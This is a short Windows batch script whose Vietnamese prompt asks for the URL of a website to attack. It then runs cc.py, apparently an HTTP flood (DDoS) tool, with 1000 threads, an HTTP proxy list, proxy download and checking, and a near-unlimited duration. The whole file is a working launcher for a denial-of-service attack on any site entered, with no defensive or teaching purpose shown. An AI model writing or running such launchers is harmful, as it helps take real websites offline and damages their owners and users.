echo @off
del http.txt
set /p SETURL="Nhập URL trang web cần tấn công: "
python3 cc.py -url %SETURL% -m cc -v http -t 1000 -f http.txt -b 1 -s 999999999999999 -down -check